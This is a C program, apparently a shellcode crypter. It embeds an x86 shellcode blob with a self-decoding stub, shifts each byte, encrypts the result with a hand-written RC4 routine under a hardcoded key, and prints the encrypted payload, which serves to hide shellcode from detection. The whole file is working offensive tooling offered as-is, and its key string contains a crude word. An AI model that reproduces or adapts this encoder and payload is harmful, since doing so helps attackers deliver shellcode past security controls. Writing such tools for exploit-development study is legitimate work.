#include <stdio.h>
#include <string.h>

#define BYTE_ARRAY 256
unsigned char s[BYTE_ARRAY];
int i;
int j;

unsigned char shellcode[] = \
"\xeb\x1c\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x16"
"\xb0\x66\xb3\x2a\x8a\x16\x30\xd0\x88\x06\x28"
"\x1e\x88\xd0\x46\xe2\xf3\xeb\x05\xe8\xdf\xff"
"\xff\xff\x3d\xd7\xad\x1e\x12\x80\xd9\x80\x1d"
"\x8f\x1d\x44\xc8\x5b\xc3\x70\x7d\x07\xdd\xe8"
"\x1f\xb5";

void swap(unsigned char *one, unsigned char *two) {
	char tmp = *one;

	*one = *two;
	*two = tmp;
}

int initialize(void) {
	int x;

	for (x = 0; x < BYTE_ARRAY; x++) {
		s[x] = x;
	}

	i = j = 0;
	return 1;
}

int key_sheduling(unsigned char *key, int lenKey) {
	for (i = 0; i < BYTE_ARRAY; i++) {
		j = (j + s[i] + key[i % lenKey]) % BYTE_ARRAY;
		swap(&s[i], &s[j]);
	}

	i = j = 0;
}

char pseudo_random(void) {
	i = (i + 1) % BYTE_ARRAY;
	j = (j + s[i]) % BYTE_ARRAY;
	swap(&s[i], &s[j]);

	return s[(s[i] + s[j]) % BYTE_ARRAY];
}

void encoder(int shellcodeLenght) {
	int x;

	for (x = 0; x < shellcodeLenght; x++) {
		shellcode[x] = shellcode[x] + 10 ;
	}
}

void main(int argc, char **argv){

	unsigned char key[] = "ch3rn0bylMysl4V3slUT";
	unsigned char pseudoRandomByte;
	unsigned char encryptedByte;
	int shellcodeLenght = strlen(shellcode);
	int lenKey = strlen(key);
	int count;

	printf("[+] Encoding shellcode ...\n");
	encoder(shellcodeLenght);
	printf("[+] Shellcode encoded\n");

	printf("[*] Start encrypting shellcode..\n");
	printf("[*] Initializing bytearray\n");
	initialize();

	printf("[*] Starting key scheduling algorithm\n");
	key_sheduling(key, lenKey);
	
	printf("[*] Bytes parsing\n");
	for (count = 0; count < shellcodeLenght; count++) {

		pseudoRandomByte = pseudo_random();
		encryptedByte = shellcode[count] ^ pseudoRandomByte;
		shellcode[count] = encryptedByte;
		printf("\\x%.2x", encryptedByte);

	}
	printf("\n[+] Shellcode encrypted\n");
}
